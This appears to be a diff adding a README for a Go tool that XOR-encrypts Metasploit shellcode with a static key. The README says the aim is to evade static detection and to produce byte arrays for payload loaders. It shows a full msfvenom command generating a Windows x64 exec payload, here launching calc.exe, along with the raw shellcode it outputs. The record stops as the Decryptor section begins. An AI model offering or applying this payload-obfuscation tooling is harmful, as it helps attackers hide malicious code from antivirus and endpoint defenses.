@@ -1,3 +1,66 @@
+# 🧩 XOR Shellcode Encryptor (Go)
+
+---
+
+
+## ✨ What It Does
+
+- 📜 Takes raw shellcode (e.g., generated from msfvenom).
+
+- 🔑 Applies a single-byte XOR key to each byte.
+
+- 🔒 Produces an obfuscated byte array (harder for static detection).
+
+- 🛠️ Outputs shellcode in a Go-friendly format → directly usable in loaders.
+
+This is a classic malware technique: keep payloads encrypted at rest and decrypt them at runtime before execution.
+
+## ⚡ How It Works
+
+Input → Raw binary shellcode (e.g. from Metasploit).
+
+Key → A static XOR key (0x85 in this case).
+
+Processing → Loops through every byte, applying cipher[i] = clear[i] ^ key.
+
+Output → Nicely formatted Go array ([]byte{...}) ready to drop into a loader.
+
+---
+
+## 🔨 Usage
+
+1️⃣ Generate Shellcode (example: spawn calc.exe 🧮)
+
+```bash
+/opt/metasploit-framework/bin/msfvenom -p windows/x64/exec CMD="calc.exe" -f raw > clean-shellcode.bin
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 276 bytes
+kant@APPLEs-MacBook-Pro ~/e/shellcode> cat clean-shellcode.bin 
+A?8?u?LLE9?u?XD?@$I?fA?H?P?HD?@ I??VH??A?4?H?M1?H1??A??
+                       HD?@I?A??H?AXAX^YZAXAYAZH?? AR??XAYZH??W???]H?H??A?1?o??ջ?VA???????H??(<|
+???u?GrojYA????calc.exe⏎    
+
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---
+---
+
 ## Decryptor
 
 ```go
